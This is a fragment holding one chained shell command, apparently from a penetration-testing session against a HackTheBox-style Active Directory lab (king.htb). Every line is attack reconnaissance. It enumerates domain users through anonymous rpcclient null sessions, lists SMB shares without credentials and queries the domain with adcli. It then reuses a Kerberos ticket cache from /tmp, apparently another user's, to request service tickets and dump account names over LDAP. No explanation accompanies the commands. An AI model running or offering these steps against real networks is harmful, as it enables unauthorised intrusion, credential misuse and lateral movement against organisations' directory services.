list.value:
echo "=TOOLS2="; which smbclient rpcclient net samba-tool adcli kvno kinit 2>/dev/null;
echo "=RPCCLIENT_NULL="; timeout 10 rpcclient -U "" -N 172.16.1.1 -c "enumdomusers" 2>&1;
echo "=RPCCLIENT_USERS="; timeout 10 rpcclient -U "" -N 172.16.1.1 -c "querydispinfo" 2>&1;
echo "=SMB_SHARES="; timeout 10 smbclient -L //172.16.1.1 -N 2>&1 | head -20;
echo "=ADCLI_INFO="; timeout 10 adcli info -D king.htb -H openAD.king.htb 2>&1 | head -30;
echo "=KVNO="; KRB5_CONFIG=/tmp/krb5_king.conf KRB5CCNAME=/tmp/krb5cc_1600801117_Qxs0zd timeout 5 kvno ldap/openAD.king.htb@KING.HTB 2>&1;
echo "=KRB5_KTK="; KRB5_CONFIG=/tmp/krb5_king.conf KRB5CCNAME=/tmp/krb5cc_1600801117_Qxs0zd timeout 5 kvno host/openAD.king.htb@KING.HTB 2>&1;
echo "=LDAP_SASL_SSSD="; KRB5_CONFIG=/var/lib/sss/pubconf/krb5.include.d/krb5_libdefaults KRB5CCNAME=/tmp/krb5cc_1600801117_Qxs0zd timeout 15 ldapsearch -Y GSSAPI -H ldap://openAD.king.htb -b "dc=king,dc=htb" "(objectClass=user)" sAMAccountName 2>&1 | head -30
